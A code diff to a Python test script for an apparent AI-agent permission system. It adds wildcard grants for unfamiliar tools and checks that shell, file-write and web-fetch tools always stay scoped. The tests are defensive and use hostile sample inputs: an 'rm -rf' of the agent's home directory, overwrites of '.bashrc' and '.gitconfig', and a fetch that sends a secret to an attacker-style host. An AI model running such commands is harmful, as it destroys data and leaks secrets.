@@ -11,7 +11,14 @@ import sys
 import tempfile
 from pathlib import Path
 
-from slackagent.grants import is_grantable, matches, subject, suggest_pattern
+from slackagent.grants import (
+    ANY,
+    MUST_BE_SCOPED,
+    is_grantable,
+    matches,
+    subject,
+    suggest_pattern,
+)
 from slackagent.store import Store
 
 failures: list[str] = []
@@ -95,13 +102,52 @@ def main() -> int:
     check("a url prefix does NOT match a lookalike host",
           not matches("WebFetch", "https://api.github.com/",
                       "WebFetch", {"url": "https://api.github.com.evil.tld/x"}))
-    check("an unknown tool has no subject and cannot be granted",
-          subject("SomeFutureTool", {"command": "x"}) is None
-          and not is_grantable("SomeFutureTool", {"command": "x"}))
+    # Changed deliberately when whole-tool grants were added: a tool this module
+    # does not know has no subject to scope by, but its NAME bounds it, so it is
+    # grantable as a whole. The safety comes from MUST_BE_SCOPED, checked in [7],
+    # not from refusing everything unfamiliar.
+    check("an unfamiliar tool has no subject",
+          subject("SomeFutureTool", {"command": "x"}) is None)
+    check("but is grantable as a whole tool",
+          is_grantable("SomeFutureTool", {"command": "x"}))
+    check("an empty tool name is never grantable",
+          not is_grantable("", {}) and not is_grantable("<unknown>", {}))
     check("malformed tool_input is not grantable",
           not is_grantable("Bash", None) and not is_grantable("Bash", "string"))
 
-    print("\n[6] persistence and revocation")
+    print("\n[6] whole-tool grants for tools with no subject")
+    subjectless = [
+        ("ToolSearch", {"query": "select:Read"}),
+        ("mcp__varys__pulse_command", {"device": "abc", "cmd": "status"}),
+        ("mcp__claude_ai_Notion__notion-search", {"query": "x"}),
+        ("TodoWrite", {"todos": []}),
+    ]
+    for tool, inp in subjectless:
+        check(f"{tool} is grantable as a whole", is_grantable(tool, inp), tool)
+        check(f"{tool} suggests the wildcard", suggest_pattern(tool, inp) == ANY,
+              suggest_pattern(tool, inp))
+        check(f"a wildcard grant covers {tool}", matches(tool, ANY, tool, inp), tool)
+
+    check("a wildcard for one mcp tool does not cover another",
+          not matches("mcp__varys__pulse_command", ANY,
+                      "mcp__varys__pulse_reboot", {"device": "abc"}))
+
+    print("\n[7] tools that must stay scoped can NEVER be granted wholesale")
+    for tool, inp in [
+        ("Bash", bash("rm -rf /home/agent")),
+        ("Write", {"file_path": "/home/agent/.gitconfig"}),
+        ("Edit", {"file_path": "/home/agent/.bashrc"}),
+        ("WebFetch", {"url": "https://evil.tld/?data=secret"}),
+    ]:
+        check(f"{tool} never suggests a wildcard",
+              suggest_pattern(tool, inp) != ANY, suggest_pattern(tool, inp))
+        # The important one: even a hand-inserted wildcard row must not match.
+        check(f"a wildcard row for {tool} is refused at match time",
+              not matches(tool, ANY, tool, inp), tool)
+    check("MUST_BE_SCOPED covers Bash and the write tools",
+          {"Bash", "Write", "Edit", "WebFetch"} <= MUST_BE_SCOPED, MUST_BE_SCOPED)
+
+    print("\n[8] persistence and revocation")
     with tempfile.TemporaryDirectory() as raw:
         store = Store(Path(raw) / "g.sqlite3")
         try:
